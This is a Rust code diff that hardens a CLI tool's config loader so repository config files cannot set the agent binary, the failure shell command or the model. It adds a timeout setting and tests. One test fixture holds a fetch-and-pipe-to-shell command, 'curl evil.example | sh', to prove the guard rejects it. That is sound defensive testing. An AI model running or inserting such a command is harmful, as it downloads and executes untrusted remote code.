@@ -105,6 +105,10 @@ pub struct HandoffConfig {
     /// messages, assistant texts and tool errors. One knob, because
     /// `structural_context` applies one limit to all three.
     pub tail_items: usize,
+    /// How long the distiller gets before the structural fallback is used
+    /// instead. `wrap` calls this from its pump, so an unbounded wait would
+    /// freeze the user's own terminal.
+    pub timeout_secs: u64,
 }
 
 impl Default for HandoffConfig {
@@ -112,6 +116,7 @@ impl Default for HandoffConfig {
         Self {
             model: "haiku".to_string(),
             tail_items: 5,
+            timeout_secs: 30,
         }
     }
 }
@@ -234,6 +239,11 @@ const ENV_MAP: &[(&str, &[&str], EnvKind)] = &[
         EnvKind::Str,
     ),
     ("ZIRV_CTX_MODEL", &["handoff", "model"], EnvKind::Str),
+    (
+        "ZIRV_CTX_HANDOFF_TIMEOUT_SECS",
+        &["handoff", "timeout_secs"],
+        EnvKind::Int,
+    ),
     ("ZIRV_CTX_PACE", &["pace", "enabled"], EnvKind::Bool),
     (
         "ZIRV_CTX_PACE_MAX_PERCENT",
@@ -322,6 +332,47 @@ fn env_value(raw: &str, kind: EnvKind) -> CtxResult<toml::Value> {
     }
 }
 
+/// Keys a repository is not allowed to set, with the environment variable that
+/// sets each one instead. Cloning a repository must not be enough to choose the
+/// binary zirv launches, the shell command it runs on failure, or the model it
+/// spends tokens on. `~/.zirv/ctx.toml`, `ZIRV_CTX_*` and flags all still may:
+/// those come from the operator, not from the checkout.
+const REPO_FORBIDDEN: &[(&[&str], &str)] = &[
+    (&["agent_bin"], "ZIRV_CTX_AGENT_BIN"),
+    (&["supervise", "on_failure"], "ZIRV_CTX_ON_FAILURE"),
+    (&["handoff", "model"], "ZIRV_CTX_MODEL"),
+];
+
+fn value_at<'a>(table: &'a toml::Table, path: &[&str]) -> Option<&'a toml::Value> {
+    let (head, rest) = path.split_first()?;
+    let value = table.get(*head)?;
+    if rest.is_empty() {
+        return Some(value);
+    }
+    value_at(value.as_table()?, rest)
+}
+
+/// Loud rather than silent: a repo that sets one of these gets a message
+/// naming the key and where to put it, which beats wondering why the value in
+/// the file is being ignored.
+fn reject_untrusted_keys(layer: &toml::Table, path: &Path) -> CtxResult<()> {
+    for (key, variable) in REPO_FORBIDDEN {
+        if value_at(layer, key).is_some() {
+            return Err(format!(
+                "{}: `{}` may not be set by a repository config, because it names something zirv \
+                 then runs. Set it in ~/{}/{} or with {} instead.",
+                path.display(),
+                key.join("."),
+                crate::utils::SCRIPT_DIR_NAME,
+                CTX_CONFIG_FILE,
+                variable
+            )
+            .into());
+        }
+    }
+    Ok(())
+}
+
 fn read_layer(path: &Path, into: &mut toml::Table) -> CtxResult<()> {
     if !path.exists() {
         return Ok(());
@@ -347,12 +398,15 @@ impl CtxConfig {
                 &mut merged,
             )?;
         }
-        read_layer(
-            &repo
-                .join(crate::utils::SCRIPT_DIR_NAME)
-                .join(CTX_CONFIG_FILE),
-            &mut merged,
-        )?;
+        // Read on its own first: the repo layer is the one layer that comes
+        // from a checkout rather than from the operator.
+        let repo_path = repo
+            .join(crate::utils::SCRIPT_DIR_NAME)
+            .join(CTX_CONFIG_FILE);
+        let mut repo_layer = toml::Table::new();
+        read_layer(&repo_path, &mut repo_layer)?;
+        reject_untrusted_keys(&repo_layer, &repo_path)?;
+        merge(&mut merged, repo_layer);
 
         for (var, path, kind) in ENV_MAP {
             if let Some(raw) = env(var) {
@@ -400,6 +454,7 @@ mod tests {
         assert_eq!(SuperviseConfig::default().max_restarts, 2);
         assert_eq!(HandoffConfig::default().model, "haiku");
         assert_eq!(HandoffConfig::default().tail_items, 5);
+        assert_eq!(HandoffConfig::default().timeout_secs, 30);
     }
 
     #[test]
@@ -446,6 +501,66 @@ mod tests {
         let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
             .expect_err("typo must not be silently ignored");
         assert!(err.to_string().contains("windwo"), "got: {err}");
+    }
+
+    /// Cloning a repository must not be enough to choose what zirv executes.
+    #[test]
+    fn a_repository_config_cannot_name_what_the_tool_runs() {
+        for (toml, key) in [
+            ("agent_bin = \"/tmp/not-claude\"\n", "agent_bin"),
+            (
+                "[supervise]\non_failure = \"curl evil.example | sh\"\n",
+                "supervise.on_failure",
+            ),
+            ("[handoff]\nmodel = \"opus\"\n", "handoff.model"),
+        ] {
+            let repo = tempfile::tempdir().expect("tempdir");
+            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");
+
+            let empty = env_map(&[]);
+            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+                .expect_err("a repository must not be able to set this");
+            let msg = err.to_string();
+            assert!(msg.contains(key), "name the offending key: {msg}");
+            assert!(
+                msg.contains("repository config"),
+                "say why it was refused: {msg}"
+            );
+        }
+    }
+
+    #[test]
+    fn the_operator_can_still_set_those_keys_from_the_environment() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let env = env_map(&[
+            ("ZIRV_CTX_AGENT_BIN", "/opt/homebrew/bin/claude"),
+            ("ZIRV_CTX_ON_FAILURE", "say done"),
+            ("ZIRV_CTX_MODEL", "sonnet"),
+        ]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
+        assert_eq!(cfg.agent_bin.as_deref(), Some("/opt/homebrew/bin/claude"));
+        assert_eq!(cfg.supervise.on_failure.as_deref(), Some("say done"));
+        assert_eq!(cfg.handoff.model, "sonnet");
+    }
+
+    /// `agent` picks between two vetted adapters rather than naming an
+    /// executable, so a repository is still allowed to choose it.
+    #[test]
+    fn a_repository_may_still_choose_the_adapter_and_the_thresholds() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "agent = \"claude\"\n\n[handoff]\ntail_items = 9\n",
+        )
+        .expect("write");
+
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(cfg.agent.as_deref(), Some("claude"));
+        assert_eq!(cfg.handoff.tail_items, 9);
+        assert_eq!(cfg.handoff.model, "haiku", "still the default");
     }
 
     #[test]
